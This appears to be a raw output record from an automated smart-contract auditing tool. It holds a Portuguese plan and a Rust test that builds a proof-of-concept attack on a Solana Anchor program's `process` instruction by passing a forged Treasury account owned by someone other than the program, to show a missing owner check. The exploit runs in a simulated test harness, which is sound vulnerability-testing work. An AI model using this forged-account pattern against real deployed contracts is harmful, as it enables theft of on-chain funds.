attempts.raw:
{
  "plan": "O cenário inicializa uma conta Treasury legítima via `initialize` para provar que o programa funciona e obter o estado esperado. Em seguida, o ataque chama `process` passando uma conta forjada pelo atacante (dono diferente do programa) com dados que imitam um Treasury ativo. O efeito medido é que a instrução aceita a conta forjada e executa com sucesso, demonstrando a falta de verificação de dono.",
  "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();

// Baseline: inicializa uma conta Treasury legítima
let init_ix = env.anchor_ix(
    "initialize",
    &(1000u64,),
    vec![
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);
let init_accounts = vec![
    (treasury_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];
let baseline_result = env.baseline("initialize treasury", &init_ix, &init_accounts);

// Ataque: chama process com uma conta forjada (dono diferente do programa)
let forged_data = anchor_account_data(
    "Treasury",
    &(authority, 500u64, true),
);
let forged_treasury = account(&Pubkey::new_unique(), &forged_data, None);

let attack_ix = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(treasury_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let attack_accounts = vec![
    (treasury_key, forged_treasury),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("process with forged treasury", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    env.effect(
        "forged treasury accepted and used",
        after(&attack_result, &treasury_key).owner() != &env.program_id,
    );
}"
}

